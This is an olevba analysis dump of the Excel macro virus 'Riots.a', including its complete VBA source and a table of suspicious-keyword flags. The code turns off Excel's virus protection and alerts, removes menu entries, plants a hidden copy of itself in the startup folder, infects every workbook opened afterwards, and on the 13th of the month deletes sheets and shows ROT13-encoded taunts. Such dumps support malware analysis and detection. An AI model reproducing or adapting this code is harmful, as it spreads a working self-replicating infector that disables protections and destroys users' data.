olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Riots.a-12d41c1f7c1839712cca0e4a58c024cbd70247c5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Riots.a-12d41c1f7c1839712cca0e4a58c024cbd70247c5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Riots.a-12d41c1f7c1839712cca0e4a58c024cbd70247c5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Riots.a-12d41c1f7c1839712cca0e4a58c024cbd70247c5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Riots.a-12d41c1f7c1839712cca0e4a58c024cbd70247c5 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Riots.bas 
in file: Virus.MSExcel.Riots.a-12d41c1f7c1839712cca0e4a58c024cbd70247c5 - OLE stream: '_VBA_PROJECT_CUR/VBA/Riots'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'if you smart you can read this enc text
'Qngr Obea: 30-Ncevy-1998
'gbqnl 1$ HF fgvyy Ec 8.000,-
'IvehfAnzr:  Evbgf
'Nhgube:  sbkm, bs AbZreplIvehfGrnz
'Terrgvat gb:
'            Pvpngevk, Nhebqercu, Wrex1a, Ze.Ivp, Bcvp,
'            Fcb0xl, FyntrUnzzre, zvxrr, AbZrepl Zrzoref naq Hygenf

Sub Auto_Open()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False
Options.VirusProtection = False
'-------------- thnx to SlageHammer for this code ----------
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Customize...").Delete
CommandBars("view").Controls("Toolbars").Delete
CommandBars("view").Controls("Status Bar").Delete
CommandBars("window").Controls("Unhide...").Delete
'-----------------------end----------------
If cek_global() Then
    GoTo FuckSheet:
Else
    infectglobal
End If
FuckSheet:
Application.OnSheetActivate = "RIOTS.XLM!Fuck"
bye:
End Sub
Sub Auto_Close()
On Error GoTo bye3
Application.DisplayAlerts = False
Application.Workbooks("RIOTS.XLM").Save
Application.ActiveWorkbook.Save 'autosafe
If Day(Date) = "13" Then
    ActiveWindow.SelectedSheets.Delete
  Assistant.Visible = True
  With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "by: Sbkm/AbZreplIvehfGrnz" & Chr$(13) & "" & Chr$(13) & "  Encripted for safe me  :o)"
    .Heading = "XM97.Riots!"
    .Animation = msoAnimationEmptyTrash
    .Show
  End With
MsgBox "Jr jnag ersbezngvba!" & Chr$(13) & "" & Chr$(13) & "1. Ybj Gur cevpr" & Chr$(13) & "2. Oevat onpx zl Ehcvnu" & Chr$(13) & "3. Ab Zber Fbrunegb Pyna!" & Chr$(13) & "" & Chr$(13) & "" & Chr$(13) & "" & Chr$(13) & "                      Sbkm/AbZreplIvehfGrnz", vbOKOnly, ">>XM.Riots<< if U smart you can read it!"
Application.ActiveWorkbook.Save
    Else
End If
bye3:
End Sub
Function cek_global() As Boolean
On Error GoTo bye3
cek_global = False
For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "RIOTS.XLM" Then
    For y = 1 To Application.Workbooks("RIOTS.XLM").Modules.Count
        If Application.Workbooks("RIOTS.XLM").Modules(y).Name = "Riots" Then
            cek_global = True
        End If
    Next y
    End If
Next x
bye3:
End Function
Function infectglobal()
  activebook = ActiveWorkbook.Name
  Workbooks(activebook).SaveCopyAs Application.StartupPath + "\RIOTS.XLM"
  Workbooks.Open (Application.StartupPath + "\RIOTS.XLM")
  Windows("RIOTS.XLM").Visible = False
 Application.Workbooks("RIOTS.XLM").Save
End Function
Function inFuckIt() As Boolean
activebook = ActiveWorkbook.Name
inFuckIt = False
For y = 1 To Application.Workbooks(activebook).Modules.Count
    If Application.Workbooks(activebook).Modules(y).Name = "Riots" Then
            inFuckIt = True
   End If
Next y
End Function
Sub Fuck()
    oactivebook = ActiveWorkbook.Name
    If inFuckIt() Then
    GoTo bye2
    Else
    End If
    Application.ScreenUpdating = False
    Application.Windows("RIOTS.XLM").Visible = True
    Workbooks("RIOTS.XLM").Activate
    Sheets("riots").Visible = True
    Workbooks("RIOTS.XLM").Sheets("Riots").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks(oactivebook).Sheets("Riots").Visible = False
    Workbooks("RIOTS.XLM").Sheets("Riots").Visible = False
    Application.Windows("RIOTS.XLM").Visible = False
bye2:
Close
End Sub




-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Riot
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

